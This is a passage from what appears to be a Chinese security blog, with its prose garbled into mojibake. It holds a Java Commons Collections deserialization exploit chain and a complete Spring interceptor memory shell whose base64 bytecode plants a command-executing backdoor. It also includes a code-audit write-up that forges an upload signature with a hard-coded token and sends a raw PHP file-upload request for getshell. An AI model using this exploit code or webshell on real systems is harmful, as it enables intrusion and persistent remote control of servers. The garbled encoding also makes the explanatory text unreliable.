import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6V2 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.appendClassPath(&quot;xxx/java/Qiu/&quot;);
        CtClass ctClass = pool.get(&quot;EvilTest&quot;);
        byte[] payloads = ctClass.toBytecode();
//        byte[] payloads = Base64.getDecoder().decode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {payloads});
        setFieldValue(templates, &quot;_name&quot;, &quot;qiuqiu&quot;);
        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, templates);

        Map expMap = new HashMap();
        expMap.put(tme, &quot;qiu&quot;);

        outerMap.clear();

        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
//
//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
//        oos.writeObject(expMap);
//        oos.close();

        unserialize(&quot;ser.bin&quot;);

    }


    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object unserialize(String file) throws IOException, ClassNotFoundException {
//        byte[] decode = Base64.getDecoder().decode(payload);
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream();
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
        Object obj = ois.readObject();
        return obj;
    }
}
</code></pre>
<p>æœ¬åœ°æ­å»ºç›¸å…³ç¯å¢ƒï¼Œåœ¨jdk8u391çš„ç¯å¢ƒä¸‹æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1705155062964.jpg" alt="" loading="lazy"><br>
ä½†æ˜¯tmdæ‰“å›æ˜¾çš„ğŸå­åˆä¸è¡Œï¼Œè°ƒè¯•äº†åŠå¤©è¿˜æ˜¯ä¸è¡ŒğŸ’¢ã€‚<br>
åˆšå¥½å¤–å–åˆ°äº†ï¼Œè¾¹åƒé¸­è„–è¾¹åˆçœ‹äº†ä¸¤çœ¼ï¼Œå‘ç°ğŸå­å¿˜è®°ç»§æ‰¿<code>AbstractTranslet</code>äº†...</p>
<h2 id="å†…å­˜é©¬">å†…å­˜é©¬</h2>
<p>èƒ½å›æ˜¾äº†ï¼Œä½†æ˜¯åœ¨å®é™…æ”»é˜²å½“ä¸­æˆ‘ä»¬æœ€å¥½è¿˜æ˜¯èƒ½å¤Ÿæ‰“å…¥å†…å­˜é©¬æ–¹ä¾¿æ“ä½œã€‚<br>
è€ƒè™‘åˆ°ç›®æ ‡ç¯å¢ƒæ˜¯springï¼Œæˆ‘ç›´æ¥å°±æ‰¾äº†ä»¥å‰çš„springInterceptorçš„å†…å­˜é©¬ï¼Œ</p>
<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.beans.BeansException;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Method;

public class SpringInterceptorMemShell extends AbstractTranslet {
    static String b64 = &quot;yv66vgAAADQBSAoAZQCFCACGCQBkAIcIAIgJAGQAiQgAigkAZACLCgBkAIwJAI0AjggAjwoAkACRCACSCwCTAJQIAJUKABMAlgoAEwCXCQCYAJkIAJoHAJsIAJwIAJ0IAJ4IAJ8HAKAKAKEAogoAoQCjCgCkAKUKABgApggApwoAGACoCgAYAKkLAKoAqwoArACRCwCTAK0LAJMArggArwgAsAsAkwCxBwCyCgAnAIUIALMKACcAtAgAtQgAtggAtwsAuAC5CAC6CgC7ALwHAL0HAL4KADIAhQsAuAC/CgAyAMAIAMEKADIAwgoAMgDDCgATAMQKADEAxQoAuwDGBwDHCgA8AIULAJMAyAoAyQDKCgA8AMsKALsAzAgAzQoARQDOCADPBwDQBwDRCQDSANMKAEUA1AoA1QDWCgBMANcKAEUA2AcA2QoA0gDaCgDVANsKAEUA3AoATACWCADdBwDeCgBSAN8KAOAA4QoA4ADiCADjCgBbAOQJAGQA5QcA5ggA5wcA6AcA6QoAXADfBwDqCgBeAN8HAOsKAGAA3wcA7AoAYgDfBwDtBwDuAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7AQATYmVoaW5kZXJTaGVsbEhlYWRlcgEAEGJlaGluZGVyU2hlbGxQd2QBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUHAJsHAO8HAPAHAN4BAApFeGNlcHRpb25zAQAKaW5pdGlhbGl6ZQcA7QcA6AcA5gcA8QcA6QcA6gcA6wcA7AEAClNvdXJjZUZpbGUBAB9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZS5qYXZhAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMAGwAbQEABHBhc3MMAGgAaQEADFgtT3B0aW9ucy1BaQwAagBpAQAQZTQ1ZTMyOWZlYjVkOTI1YgwAawBpDAB4AG0HAPIMAPMA9AEAIlsrXSBEeW5hbWljIEludGVyY2VwdG9yIHNheXMgaGVsbG8HAPUMAPYA9wEABHR5cGUHAPgMAPkA+gEABWJhc2ljDAD7APwMAP0A/gcA/wwBAABpAQABLwEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAANjbWQBAAIvQwEAEWphdmEvdXRpbC9TY2FubmVyBwEBDAECAQMMAQQBBQcBBgwBBwEIDABsAQkBAAJcQQwBCgELDAEMAQ0HAQ4MAQ8BEAcBEQwBEgD6DAETAQ0BAARQT1NUAQAGUWl1UUl1DAEUARUBABFqYXZhL3V0aWwvSGFzaE1hcAEAB3JlcXVlc3QMARYBFwEACHJlc3BvbnNlAQAHc2Vzc2lvbgEAAXUHARgMARkBGgEAA0FFUwcA7wwBGwEcAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEdAR4MAR8BIAEAAAwBHwEhDAEiAQ0MASMBJAwAbAElDAEmAScBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEoASkHASoMASsBDQwBLAEtDAEuAS8BABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMATABMQEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IHATIMATMAZwwBNAE1BwDxDAE2ATcMATgBOQwBOgE7AQAQamF2YS9sYW5nL09iamVjdAwBPAE9DAE+AT8MAUABQQEAB1FpdVlZRFMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFCAG0HAUMMAUQBRQwBRgE7AQAnY29tLmZlaWhvbmcubGRhcC50ZW1wbGF0ZS5NeUNsYXNzTG9hZGVyDAFHATEMAGYAZwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcxd2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFkyeGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVhaaERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05NYjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBQ0VBQWdBRkFBQUFBQUFDQUFBQUJnQUhBQUVBQ0FBQUFEb0FBZ0FDQUFBQUJpb3J0d0FCc1FBQUFBSUFDUUFBQUFZQUFRQUFBQVFBQ2dBQUFCWUFBZ0FBQUFZQUN3QU1BQUFBQUFBR0FBMEFEZ0FCQUFrQUR3QVFBQUVBQ0FBQUFFUUFCQUFDQUFBQUVMc0FBbGtydHdBREtnTXF2cllBQkxBQUFBQUNBQWtBQUFBR0FBRUFBQUFJQUFvQUFBQVdBQUlBQUFBUUFCRUFFZ0FBQUFBQUVBQVRBQTRBQVFBQkFCUUFBQUFDQUJVPQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAaRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEACWxvYWRDbGFzcwAhAGQAZQAAAAQAAgBmAGcAAAACAGgAaQAAAAIAagBpAAAAAgBrAGkAAAADAAEAbABtAAEAbgAAAEcAAgABAAAAGyq3AAEqEgK1AAMqEgS1AAUqEga1AAcqtwAIsQAAAAEAbwAAABoABgAAABgABAAUAAoAFQAQABYAFgAZABoAGgABAHAAcQACAG4AAAKHAAcACwAAAcGyAAkSCrYACysSDLkADQIAxgCQKxIMuQANAgASDrYAD5kAgCsqtAADuQANAgA6BBkExgGOGQS2ABCaAYYBOgWyABESErYAD5kAGwa9ABNZAxIUU1kEEhVTWQUZBFM6BqcAGAa9ABNZAxIWU1kEEhdTWQUZBFM6BrsAGFm4ABkZBrYAGrYAG7cAHBIdtgAetgAfOgcsuQAgAQAZB7YAIQOsKyq0AAW5ACICAMYBFSu5ACMBABIktgAPmQD9sgAJEiW2AAsruQAmAQA6BrsAJ1m3ACg6BxkHEikrtgAqVxkHEisstgAqVxkHEiwZBrYAKlcqtAAHOgQZBhItGQS5AC4DABIvuAAwOgUZBQW7ADFZuwAyWbcAMxkGEi25ADQCALYANRI2tgA3tgA4tgA5Ei+3ADq2ADsZBbsAPFm3AD0ruQA+AQC2AD+2AEC2AEE6CBJCuABDEkQGvQBFWQMSRlNZBLIAR1NZBbIAR1O2AEg6CRkJBLYASRkJKrYASrYASwa9AExZAxkIU1kEA7gATVNZBRkIvrgATVO2AE7AAEU6ChkKtgBPGQe2AFBXsgAJElG2AAsDrKcACjoGGQa2AFMErAABAK0BtAG4AFIAAgBvAAAAigAiAAAAHQAIACAAIwAhAC8AIgA8ACMAPwAlAEoAJgBiACgAdwArAJMALACeAC0AoAAvAK0AMQC7ADIAwwAzAMsANADUADUA3QA2AOYANwDwADgA9gA5AQEAOgEIADsBNQA8AU8APQFwAD4BdgA/AaAAQAGrAEEBswBCAbUARgG4AEQBugBFAb8ASQByAAAAHAAG/QBiBwBzBwB0/AAUBwB1+AAo+wEUQgcAdgYAdwAAAAQAAQBSAAIAeABtAAEAbgAAAXgABwAHAAAAlbgAVLYAVUwqKxJWtgBXtQBYpwBrTRJaTrsAPFm3AD0ttgBAOgQBOgUSWxJEBr0ARVkDEkZTWQSyAEdTWQWyAEdTtgBIOgUZBQS2AEkqGQUrBr0ATFkDGQRTWQQDuABNU1kFGQS+uABNU7YATsAARbUAWKcACjoGGQa2AF2nABhMK7YAX6cAEEwrtgBhpwAITCu2AGOxAAUABwARABQAWQAoAHIAdQBcAAAAfAB/AF4AAAB8AIcAYAAAAHwAjwBiAAIAbwAAAF4AFwAAAE4ABwBRABEAXgAUAFIAFQBTABgAVAAlAFUAKABYAEYAWQBMAFoAcgBdAHUAWwB3AFwAfABlAH8AXwCAAGAAhABlAIcAYQCIAGIAjABlAI8AYwCQAGQAlABnAHIAAABFAAf/ABQAAgcAeQcAegABBwB7/wBgAAYHAHkHAHoHAHsHAHMHAEYHAHwAAQcAff8ABgABBwB5AABCBwB+RwcAf0cHAIAEAAIAgQAAAAIAggCDAAAABgABAIQAAA==&quot;;
    static String clazzName = &quot;DynamicInterceptorTemplate&quot;;

    static {
        try {
            Class&lt;?&gt; RequestContextUtils = Class.forName(&quot;org.springframework.web.servlet.support.RequestContextUtils&quot;);

            Method getWebApplicationContext;
            try {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;getWebApplicationContext&quot;, ServletRequest.class);
            } catch (NoSuchMethodException e) {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;findWebApplicationContext&quot;, HttpServletRequest.class);
            }
            getWebApplicationContext.setAccessible(true);

            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

            //ä»requestMappingHandlerMappingä¸­è·å–adaptedInterceptorså±æ€§ è€ç‰ˆæœ¬æ˜¯DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
            try {
                Class&lt;?&gt; RequestMappingHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
            } catch (BeansException e) {
                Class&lt;?&gt; DefaultAnnotationHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot;);
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
            }

            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
            field.setAccessible(true);
            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);

            //åŠ è½½ysoserial.payloads.templates.SpringInterceptorTemplateç±»çš„å­—èŠ‚ç 
            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
            //æ·»åŠ SpringInterceptorTemplateç±»åˆ°adaptedInterceptors
            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
</code></pre>
<p>æˆåŠŸæ‰§è¡Œ<br>
<img src="https://sl3epf.github.io/post-images/1705156354824.png" alt="" loading="lazy"><br>
ä½†æ˜¯è²Œä¼¼è·¯å¾„åªèƒ½é™åˆ¶åœ¨<code>/3.0/authService/config</code>è¿™é‡Œã€‚<br>
æµ‹è¯•tomcatçš„listenerç±»å‹å†…å­˜é©¬ä¹Ÿå¯ä»¥ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1705156537262.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä»£ç å®¡è®¡-æŸäº‘ç›˜ç³»ç»ŸGetShell]]></title>
        <id>https://sl3epf.github.io/post/CGspU2zIY/</id>
        <link href="https://sl3epf.github.io/post/CGspU2zIY/">
        </link>
        <updated>2024-01-04T04:50:09.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>çœ‹åˆ°è¿™ä¸ªç³»ç»Ÿçš„æ–‡ä»¶ä¸Šä¼ æŒºæœ‰æ„æ€çš„ï¼Œå¼„äº†å¥—æºç è¿‡æ¥çœ‹çœ‹ã€‚</p>
<h1 id="åˆ†æ">åˆ†æ</h1>
<p>æ¼æ´è·¯ç”±åœ¨ /server/index.php<br>
å¯¹åº”æ–‡ä»¶çš„æ¼æ´ç‚¹å‡½æ•°<br>
<img src="https://sl3epf.github.io/post-images/1704344315196.png" alt="" loading="lazy"><br>
å¯ä»¥çœ‹åˆ°é€šè¿‡ md å‚æ•°å¯ä»¥è¿›è¡Œ upload å’Œ download çš„æ“ä½œ<br>
ä½†æ˜¯é¦–å…ˆè¿˜æ˜¯è¦è¿‡å‰é¢ä¸‰ä¸ª ifï¼Œç¬¬ä¸€ä¸ªç›´æ¥ä¼  md=upload å°±å¥½ï¼Œç¬¬äºŒä¸ªéœ€è¦æ¥æ”¶ä¸€ä¸ª sign çš„ç­¾åå‚æ•°ã€‚<br>
é‡ç‚¹çœ‹ç¬¬ä¸‰ä¸ªï¼Œéœ€è¦éªŒè¯ç­¾åï¼Œæˆ‘ä»¬è·Ÿå…¥</p>
<pre><code class="language-php">protected function sign_verify($params,$sign): bool
{
        return $this-&gt;sign_params($params) == $sign;
}

 protected function sign_params($params): string
    {
        // è¿‡æ»¤å‚æ•°
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // asciiæ’åº
        ksort($params);
        reset($params);

        // ç­¾å
        return md5(urldecode(http_build_query($params)) . $this-&gt;config['token']);
    }
</code></pre>
<p>æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªå‡½æ•°çš„ç›®çš„æ˜¯å¯¹ä¸€ç»„å‚æ•°è¿›è¡Œç­¾åï¼Œé¦–å…ˆé€šè¿‡è¿‡æ»¤å’Œæ’åºç¡®ä¿å‚æ•°çš„ä¸€è‡´æ€§ï¼Œç„¶ååˆ©ç”¨<code>http_build_query</code>å°†å‚æ•°è¿æ¥æˆå­—ç¬¦ä¸²ï¼ŒåŠ ä¸Štokenï¼Œæœ€åç”¨md5ç”Ÿæˆ signï¼Œåˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„ sign æ˜¯å¦å’Œç”Ÿæˆçš„ç›¸ç­‰ã€‚<br>
è€Œè¿™ä¸ª token æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥æ‰¾åˆ°ï¼Œæ˜¯ç¡¬ç¼–ç <br>
<img src="https://sl3epf.github.io/post-images/1704345026812.png" alt="" loading="lazy"><br>
äºæ˜¯å°±å¯ä»¥æ„é€ å‡ºæ–‡ä»¶ä¸Šä¼ <br>
<img src="https://sl3epf.github.io/post-images/1704345196242.jpg" alt="" loading="lazy"><br>
æˆ‘ä»¬å¾€ä¸‹çœ‹å‘ç°è¿™é‡Œéœ€è¦ä¼ å…¥ä¸€ä¸ª uid å‚æ•°ï¼Œç„¶åè¿›å…¥ <code>upload_file</code> å‡½æ•°<br>
<img src="https://sl3epf.github.io/post-images/1704345294348.png" alt="" loading="lazy"><br>
è·Ÿè¿›å»çœ‹ä¹Ÿå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§„çš„æ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ã€‚<br>
æ„é€ å‡ºä¸Šä¼ è¯·æ±‚ï¼Œå…¶ä¸­ä¼ å…¥çš„ uid ä¼šä½œä¸ºæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•</p>
<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=e8766abd8742eb67a2c07b089ecf636a&amp;uid=1 HTTP/2.0
Host: xxxx
Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
cookie: xxxx
Content-Length: 457

--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;

test

--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
</code></pre>
<p>å‘åŒ…åå°±ä¼šèµ°åˆ°</p>
<pre><code class="language-php">// å›è°ƒé€šçŸ¥
                $res = $this-&gt;upload_notify($_GET['notify'],$info);
                if($res != 'UPLOAD_SUCCESS'){
                    $this-&gt;returnJson(0,'åŒæ­¥é”™è¯¯ï¼š'.$res);
                }
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1704345614802.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œè™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯å…¶å®å·²ç»ä¼ ä¸Šå»äº†...å› ä¸º<code>upload_file</code>å‡½æ•°å·²ç»èµ°å®Œäº†<br>
ä½†æ˜¯ä»–å¹¶æ²¡æœ‰è¿”å›ç»™æˆ‘ä»¬è·¯å¾„ï¼Œå¹¶ä¸”åœ¨å‡½æ•°é‡Œå¯ä»¥çœ‹åˆ°ä»–çš„æ–‡ä»¶åæ˜¯éšæœºçš„ 16 ä½å­—ç¬¦</p>
<pre><code class="language-php">// æ–‡ä»¶åç¼€
        $file_ext = strtolower(pathinfo($file['name'],PATHINFO_EXTENSION));

        // è·å–ä¿å­˜ç›®å½•
        $save_dir = $this-&gt;getUserUploadPath($uid);

        // è·å–ä¿å­˜æ–‡ä»¶å¤¹
        $file_name = 'file_'.$this-&gt;getRandomName(16);

        // æœ€ç»ˆä¿å­˜è·¯å¾„
        $save_file = $this-&gt;runtime_path . $save_dir . $file_name .'.'. $file_ext;

        // ä¿å­˜æ–‡ä»¶
        move_uploaded_file($file[&quot;tmp_name&quot;], $save_file);


        if(!is_file($save_file)){
            $this-&gt;returnJson(0,'æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼šError Move Files');
        }
</code></pre>
<p>ä½†æ˜¯æœ‰è¶£çš„æ˜¯ä»–ä¸‹é¢è¿˜è°ƒç”¨äº†ä¸€ä¸ª<code>upload_notify</code>å‡½æ•°ï¼Œè·Ÿè¿›</p>
<pre><code class="language-php">protected function upload_notify($url,$param)
    {
        // ç”Ÿæˆç­¾å
        $sign = $this-&gt;sign_params($param);
        $param['sign'] = $sign;

        // è¯·æ±‚åœ°å€
        $request_url = $url.'?'.urldecode(http_build_query($param));

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request_url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
</code></pre>
